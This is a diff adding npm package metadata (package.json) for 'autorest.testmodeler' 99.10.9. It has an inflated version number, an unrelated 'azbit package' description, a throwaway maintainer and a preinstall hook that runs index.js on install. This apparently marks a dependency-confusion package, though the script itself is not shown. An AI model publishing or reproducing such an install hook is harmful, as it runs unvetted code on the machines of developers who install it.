@@ -1,0 +1,39 @@
+{
+    "name": "autorest.testmodeler",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "autorest.testmodeler@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-9Sa6hF/QUcLK8e/h/6yiy8cxmxW3CP1WGb+t4jT7zXz/9eSTWq8TM4+XTn7zwd8vQfhloxo0jzeoZU7bjnqE7g==",
+        "shasum": "794f243a1daef7b2ef2b9bc343ff5dcd8459a2cb",
+        "tarball": "https://registry.npmjs.org/autorest.testmodeler/-/autorest.testmodeler-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5072,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPI6DACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpqvw/+J0pWw3nr+28RUnlm1Jt0AfvJY3mTmi9JvcIjmp8FUgvtWa7a\r\n0xsjfGiGlClu0qqF3L51HyYgpLcsWmZWb72zwvw4EECDcGdr1xTu38aADsxA\r\nQS5kV/+XcIn4CgJ4DkeNmsXcy35dy3kxwd2xDV2LPFeBD8rh7DwsKFva4YgJ\r\nr26gdJu7Uak8Ag0v1cM9l2DyV7R5BbAriYEgmKtgFreeY7ASqRr31/XgtM10\r\nWMOs+rhu+9sOZ+V3uWwAe+QudNTmSvs7wpAw6IYt6GnkfEilf0KlQozK5QtD\r\n8sxeC20EUCnSJogcrrFTj8F+13EEWEcsNt79JyDmPuJKCGs0gbMHbSIj9MhS\r\nYV1xGpeDmWFd6Pw1FZzdvUOfYM6sQR5N/tI9p22SnOnCyRAjTUfgaus/1h4O\r\nEbN9M7kXDx54uqt+ZyRH9iXG4gy8KDlDynLX/Mrf+1Cbku8I6o1H2yTVVySw\r\nz0kz0BvaV6EtEbGYnNzwZrd3vU14tHmHRKfB52j2c30qz9Sxz+pucvTfvtyR\r\neOB6nvZSg9t07fqEJDBW2ZFD8FDDrT+1gqiv0o3IQUgbQ3BA5+ltRm45xdnn\r\njiexD0Ar/W+3iVnak+H27F+PzDGaWyiCebdcCt96O2tIVyaMqXfTtvDadO7+\r\nGvAbBavCf5Kz0Isj+W7OOQhFfe/PfLnM4Q4=\r\n=KOkN\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "qtqm1z38",
+        "email": "qtqm1z38@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "qtqm1z38",
+            "email": "qtqm1z38@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/autorest.testmodeler_99.10.9_1648135811513_0.9437641076018428"
+    },
+    "_hasShrinkwrap": false
+}
